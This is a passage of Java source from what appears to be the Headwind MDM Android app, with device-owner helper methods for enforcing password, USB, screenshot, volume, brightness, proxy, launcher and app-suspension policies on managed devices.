                boolean tokenActive = dpm.isResetPasswordTokenActive(adminComponentName);
                if (!tokenActive) {
                    return false;
                }
                return dpm.resetPasswordWithToken(adminComponentName, password, getDataToken(context).getBytes(), 0);
            } else {
                return dpm.resetPassword(password, 0);
            }
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean isMobileDataEnabled(Context context) {
        ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
        // A hack: use private API
        // https://stackoverflow.com/questions/12686899/test-if-background-data-and-packet-data-is-enabled-or-not?rq=1
        try {
            Class clazz = Class.forName(cm.getClass().getName());
            Method method = clazz.getDeclaredMethod("getMobileDataEnabled");
            method.setAccessible(true); // Make the method callable
            // get the setting for "mobile data"
            return (Boolean) method.invoke(cm);
        } catch (Exception e) {
            // Let it will be true by default
            return true;
        }

    }

    public static boolean isPackageInstalled(Context context, String targetPackage){
        PackageManager pm = context.getPackageManager();
        try {
            PackageInfo info = pm.getPackageInfo(targetPackage,PackageManager.GET_META_DATA);
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
        return true;
    }

    public static boolean isMiui(Context context) {
        return isPackageInstalled(context, "com.miui.home") ||
                isPackageInstalled(context, "com.miui.securitycenter");
    }

    public static boolean lockSafeBoot(Context context) {
        if (!isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return false;
        }

        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

        try {
            devicePolicyManager.addUserRestriction(adminComponentName, UserManager.DISALLOW_SAFE_BOOT);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean lockUsbStorage(boolean lock, Context context) {
        if (!isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            try {
                // Deprecated way to lock USB
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR1) {
                    Settings.Secure.putInt(context.getContentResolver(), Settings.Secure.USB_MASS_STORAGE_ENABLED, 0);
                } else {
                    Settings.Global.putInt(context.getContentResolver(), Settings.Global.USB_MASS_STORAGE_ENABLED, 0);
                }
            } catch (Exception e) {
                return false;
            }
            return true;
        }

        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

        try {
            if (lock) {
                devicePolicyManager.addUserRestriction(adminComponentName, UserManager.DISALLOW_USB_FILE_TRANSFER);
                devicePolicyManager.addUserRestriction(adminComponentName, UserManager.DISALLOW_MOUNT_PHYSICAL_MEDIA);
            } else {
                devicePolicyManager.clearUserRestriction(adminComponentName, UserManager.DISALLOW_USB_FILE_TRANSFER);
                devicePolicyManager.clearUserRestriction(adminComponentName, UserManager.DISALLOW_MOUNT_PHYSICAL_MEDIA);
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean setBrightnessPolicy(Boolean auto, Integer brightness, Context context) {
        if (!isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return false;
        }

        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

        try {
            if (auto == null) {
                // This means we should unlock brightness
                devicePolicyManager.clearUserRestriction(adminComponentName, UserManager.DISALLOW_CONFIG_BRIGHTNESS);
            } else {
                // Managed brightness
                devicePolicyManager.addUserRestriction(adminComponentName, UserManager.DISALLOW_CONFIG_BRIGHTNESS);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    // This option is available in Android 9 and above
                    if (auto) {
                        devicePolicyManager.setSystemSetting(adminComponentName, Settings.System.SCREEN_BRIGHTNESS_MODE, "1");
                    } else {
                        devicePolicyManager.setSystemSetting(adminComponentName, Settings.System.SCREEN_BRIGHTNESS_MODE, "0");
                        if (brightness != null) {
                            devicePolicyManager.setSystemSetting(adminComponentName, Settings.System.SCREEN_BRIGHTNESS, "" + brightness);
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean setScreenTimeoutPolicy(Boolean lock, Integer timeout, Context context) {
        if (!isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return false;
        }

        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

        try {
            if (lock == null || !lock) {
                // This means we should unlock screen timeout
                devicePolicyManager.clearUserRestriction(adminComponentName, UserManager.DISALLOW_CONFIG_SCREEN_TIMEOUT);
            } else {
                // Managed screen timeout
                devicePolicyManager.addUserRestriction(adminComponentName, UserManager.DISALLOW_CONFIG_SCREEN_TIMEOUT);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && timeout != null) {
                    // This option is available in Android 9 and above
                    devicePolicyManager.setSystemSetting(adminComponentName, Settings.System.SCREEN_OFF_TIMEOUT, "" + (timeout * 1000));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean lockVolume(Boolean lock, Context context) {
        if (!isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return false;
        }

        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

        try {
            if (lock == null || !lock) {
                Log.d(Const.LOG_TAG, "Unlocking volume");
                devicePolicyManager.clearUserRestriction(adminComponentName, UserManager.DISALLOW_ADJUST_VOLUME);
            } else {
                Log.d(Const.LOG_TAG, "Locking volume");
                devicePolicyManager.addUserRestriction(adminComponentName, UserManager.DISALLOW_ADJUST_VOLUME);
            }
        } catch (Exception e) {
            Log.w(Const.LOG_TAG, "Failed to lock/unlock volume: " + e.getMessage());
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean setVolume(int percent, Context context) {
        int[] streams = {
            AudioManager.STREAM_VOICE_CALL,
            AudioManager.STREAM_SYSTEM,
            AudioManager.STREAM_RING,
            AudioManager.STREAM_MUSIC,
            AudioManager.STREAM_ALARM
        };
        try {
            AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
            for (int s : streams) {
                setVolumeInternal(audioManager, s, percent);

                int v = audioManager.getStreamVolume(s);
                if (v == 0) {
                    v = 1;
                }
            }
            return true;
        } catch (Exception e) {
            Log.w(Const.LOG_TAG, "Failed to set volume: " + e.getMessage());
            e.printStackTrace();
            return false;
        }
    }

    private static void setVolumeInternal(AudioManager audioManager, int stream, int percent) throws Exception {
        int maxVolume = audioManager.getStreamMaxVolume(stream);
        int volume = (maxVolume * percent) / 100;
        audioManager.setStreamVolume(stream, volume, 0);
    }

    public static boolean disableScreenshots(Boolean disabled, Context context) {
        if (!isDeviceOwner(context) || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return false;
        }

        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

        try {
            devicePolicyManager.setScreenCaptureDisabled(adminComponentName, disabled);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    // Returns true if the current password is good enough, or false elsewhere
    public static boolean setPasswordMode(String passwordMode, Context context) {
        // This function works with a (deprecated) device admin as well
        // So we don't check that it has device owner rights!
        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                    Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

            if (passwordMode == null) {
                devicePolicyManager.setPasswordQuality(adminComponentName, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
            } else if (passwordMode.equals(Const.PASSWORD_QUALITY_PRESENT)) {
                devicePolicyManager.setPasswordQuality(adminComponentName, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC);
                devicePolicyManager.setPasswordMinimumLength(adminComponentName, 1);
            } else if (passwordMode.equals(Const.PASSWORD_QUALITY_EASY)) {
                devicePolicyManager.setPasswordQuality(adminComponentName, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC);
                devicePolicyManager.setPasswordMinimumLength(adminComponentName, 6);
            } else if (passwordMode.equals(Const.PASSWORD_QUALITY_MODERATE)) {
                devicePolicyManager.setPasswordQuality(adminComponentName, DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC);
                devicePolicyManager.setPasswordMinimumLength(adminComponentName, 8);
            } else if (passwordMode.equals(Const.PASSWORD_QUALITY_STRONG)) {
                devicePolicyManager.setPasswordQuality(adminComponentName, DevicePolicyManager.PASSWORD_QUALITY_COMPLEX);
                devicePolicyManager.setPasswordMinimumLowerCase(adminComponentName, 1);
                devicePolicyManager.setPasswordMinimumUpperCase(adminComponentName, 1);
                devicePolicyManager.setPasswordMinimumNumeric(adminComponentName, 1);
                devicePolicyManager.setPasswordMinimumSymbols(adminComponentName, 1);
                devicePolicyManager.setPasswordMinimumLength(adminComponentName, 8);
            }
            boolean result = devicePolicyManager.isActivePasswordSufficient();
            if (passwordMode != null) {
                RemoteLogger.log(context, Const.LOG_DEBUG, "Active password quality sufficient: " + result);
            }
            return result;
        } catch (Exception e) {
            e.printStackTrace();
            // If the app doesn't have enough rights, let's leave password quality as is
            if (passwordMode != null) {
                RemoteLogger.log(context, Const.LOG_WARN, "Failed to update password quality: " + e.getMessage());
            }
            return true;
        }
    }

    public static boolean setTimeZone(String timeZone, Context context) {
        if (!Utils.isDeviceOwner(context) || timeZone == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            return true;
        }

        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(
                    Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);

            if (timeZone.equals("auto")) {
                // Note: in Android 11, there is a special method for setting auto time zone
                devicePolicyManager.setGlobalSetting(adminComponentName, Settings.Global.AUTO_TIME_ZONE, "1");
            } else {
                devicePolicyManager.setGlobalSetting(adminComponentName, Settings.Global.AUTO_TIME_ZONE, "0");
                return devicePolicyManager.setTimeZone(adminComponentName, timeZone);
            }
        } catch (Exception e) {
            e.printStackTrace();
            return true;
        }
        return true;
    }

    @SuppressLint("SourceLockedOrientationActivity")
    public static void setOrientation(Activity activity, ServerConfig config) {
        String loggedOrientation = "unspecified";
        if (config.getOrientation() != null && config.getOrientation() != 0) {
            switch (config.getOrientation()) {
                case Const.SCREEN_ORIENTATION_PORTRAIT:
                    activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
                    loggedOrientation = "portrait";
                    break;
                case Const.SCREEN_ORIENTATION_LANDSCAPE:
                    activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
                    loggedOrientation = "landscape";
                    break;
                default:
                    activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED);
                    break;
            }
        } else {
            activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_UNSPECIFIED);
        }
        Log.i(Const.LOG_TAG, "Set orientation: " + loggedOrientation);
    }

    public static boolean isLauncherIntent(Intent intent) {
        if (intent == null) {
            return false;
        }
        Set<String> categories = intent.getCategories();
        if (categories == null) {
            return false;
        }
        for (String c : categories) {
            if (c.equals(Intent.CATEGORY_LAUNCHER)) {
                return true;
            }
        }
        return false;
    }

    public static String getDefaultLauncher(Context context) {
        ActivityInfo defaultLauncherInfo = getDefaultLauncherInfo(context);
        if (defaultLauncherInfo != null) {
            return defaultLauncherInfo.packageName;
        } else {
            return null;
        }
    }

    public static ActivityInfo getDefaultLauncherInfo(Context context) {
        PackageManager localPackageManager = context.getPackageManager();
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        ResolveInfo info = localPackageManager.resolveActivity(intent,
                PackageManager.MATCH_DEFAULT_ONLY);
        if (info == null || info.activityInfo == null) {
            return null;
        }
        return info.activityInfo;
    }

    public static boolean isServiceRunning(Context context, Class<?> serviceClass) {
        try {
            ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningServiceInfo> runningServices = manager.getRunningServices(Integer.MAX_VALUE);
            for (ActivityManager.RunningServiceInfo service : runningServices) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public static void setDefaultLauncher(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }
        IntentFilter filter = new IntentFilter(Intent.ACTION_MAIN);
        filter.addCategory(Intent.CATEGORY_HOME);
        filter.addCategory(Intent.CATEGORY_DEFAULT);

        ComponentName activity = new ComponentName(context, MainActivity.class);
        setPreferredActivity(context, filter, activity, "Set Headwind MDM as default launcher");
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public static void clearDefaultLauncher(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }
        IntentFilter filter = new IntentFilter(Intent.ACTION_MAIN);
        filter.addCategory(Intent.CATEGORY_HOME);
        filter.addCategory(Intent.CATEGORY_DEFAULT);

        setPreferredActivity(context, filter, null, "Reset default launcher");
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public static void setAction(Context context, Action action) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }
        try {
            IntentFilter filter = new IntentFilter("android.intent.action." + action.getAction());

            if (action.getCategories() != null && action.getCategories().length() > 0) {
                String[] categories = action.getCategories().split(",");
                for (String category : categories) {
                    filter.addCategory("android.intent.category." + category);
                }
            }

            if (action.getMimeTypes() != null && action.getMimeTypes().length() > 0) {
                String[] mimeTypes = action.getMimeTypes().split(",");
                for (String mimeType : mimeTypes) {
                    try {
                        filter.addDataType(mimeType);
                    } catch (IntentFilter.MalformedMimeTypeException e) {
                    }
                }
            }

            if (action.getSchemes() != null && action.getSchemes().length() > 0) {
                String[] schemes = action.getSchemes().split(",");
                for (String scheme : schemes) {
                    filter.addDataScheme(scheme);
                }

                if (action.getHosts() != null && action.getHosts().length() > 0) {
                    String[] hosts = action.getHosts().split(",");
                    for (String host : hosts) {
                        String[] hostport = host.split(":");
                        switch (hostport.length) {
                            case 0:
                                break;
                            case 1:
                                filter.addDataAuthority(hostport[0], null);
                                break;
                            case 2:
                                filter.addDataAuthority(hostport[0], hostport[1]);
                                break;
                        }
                    }
                }
            }

            ComponentName activity = new ComponentName(action.getPackageId(), action.getActivity());
            if (activity != null) {
                setPreferredActivity(context, filter, activity, "Set " + action.getPackageId() + "/" + action.getActivity() + " as default for " + action.getAction());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private static void setPreferredActivity(Context context, IntentFilter filter, ComponentName activity, String logMessage) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }

        // Set the activity as the preferred option for the device.
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
        DevicePolicyManager dpm =
                (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        try {
            if (activity != null) {
                dpm.addPersistentPreferredActivity(adminComponentName, filter, activity);
            } else {
                dpm.clearPackagePersistentPreferredActivities(adminComponentName, context.getPackageName());
            }
            RemoteLogger.log(context, Const.LOG_DEBUG, logMessage + " - success");
        } catch (Exception e) {
            e.printStackTrace();
            RemoteLogger.log(context, Const.LOG_WARN, logMessage + " - failure: " + e.getMessage());
        }
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public static void releaseUserRestrictions(Context context, String restrictions) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }

        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null || !dpm.isDeviceOwnerApp(context.getPackageName())) {
            return;
        }

        String[] restrictionList = restrictions.split(",");
        for (String r : restrictionList) {
            try {
                dpm.clearUserRestriction(adminComponentName, r.trim());
            } catch (Exception e) {
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public static void lockUserRestrictions(Context context, String restrictions) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }

        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null || !dpm.isDeviceOwnerApp(context.getPackageName())) {
            return;
        }

        String[] restrictionList = restrictions.split(",");
        for (String r : restrictionList) {
            try {
                dpm.addUserRestriction(adminComponentName, r.trim());
            } catch (Exception e) {
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public static void unlockUserRestrictions(Context context, String restrictions) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return;
        }

        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null || !dpm.isDeviceOwnerApp(context.getPackageName())) {
            return;
        }

        String[] restrictionList = restrictions.split(",");
        for (String r : restrictionList) {
            try {
                dpm.clearUserRestriction(adminComponentName, r.trim());
            } catch (Exception e) {
            }
        }
    }

    // Setting proxyUrl=null clears the proxy previously set up
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public static boolean setProxy(Context context, String proxyUrl) {
        ComponentName adminComponentName = LegacyUtils.getAdminComponentName(context);
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        try {
            ProxyInfo proxyInfo = null;
            if (proxyUrl != null) {
                String[] parts = proxyUrl.split(":");
                if (parts.length != 2) {
                    Log.d(Const.LOG_TAG, "Invalid proxy URL: " + proxyUrl);
                    return false;
                }
                int port = Integer.parseInt(parts[1]);
                proxyInfo = ProxyInfo.buildDirectProxy(parts[0], port);
            }
            dpm.setRecommendedGlobalProxy(adminComponentName, proxyInfo);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    /**
     * Load file content to String
     */
    public static String loadFileAsString(String filePath) throws java.io.IOException {
        StringBuffer fileData = new StringBuffer();
        BufferedReader reader = new BufferedReader(new FileReader(filePath));
        char[] buf = new char[1024];
        int numRead = 0;
        while((numRead = reader.read(buf)) != -1){
            String readData = String.valueOf(buf, 0, numRead);
            fileData.append(readData);
        }
        reader.close();
        return fileData.toString();
    }


    /**
     * Load input stream as String
     */
    public static String loadStreamAsString(InputStreamReader inputStreamReader) {
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(inputStreamReader);
            StringBuilder sb = new StringBuilder();
            String s;
            while ((s = reader.readLine()) != null) {
                sb.append(s + "\n");
            }
            return sb.toString();
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

    }

    /**
     * Write String to file
     */
    public static boolean writeStringToFile(String fileName, String fileContent, boolean overwrite) {
        try {
            File file = new File(fileName);
            if (file.exists()) {
                if (overwrite) {
                    file.delete();
                } else {
                    return false;
                }
            }

            file.createNewFile();
            FileOutputStream fos = new FileOutputStream(file);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.append(fileContent);
            writer.close();
            fos.close();
            return true;
        } catch (Exception e) {
            return false;
        }

    }

    /**
     * Starting foreground service of special use
     */
    public static void startStableForegroundService(Service service, int notificationId, Notification notification) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int serviceType = Utils.isDeviceOwner(service) ?
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SYSTEM_EXEMPTED :
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
            try {
                service.startForeground(notificationId, notification, serviceType);
            } catch (/* ForegroundServiceTypeNotAllowed*/Exception e) {
                service.startForeground(notificationId, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            }
        } else {
            service.startForeground(notificationId, notification);
        }
    }

    /**
     * Lock or unlock packages
     */
    public static void lockPackages(Context context, String packages, boolean lock) {
        if (packages != null &&
                Utils.isDeviceOwner(context) &&
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            ComponentName deviceAdmin = LegacyUtils.getAdminComponentName(context);
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            packages.replace(" ", "");
            String[] pkgs = packages.split(",");
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    devicePolicyManager.setPackagesSuspended(deviceAdmin, pkgs, lock);
                }
                for (String pkg : pkgs) {
                    devicePolicyManager.setApplicationHidden(deviceAdmin, pkg, lock);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
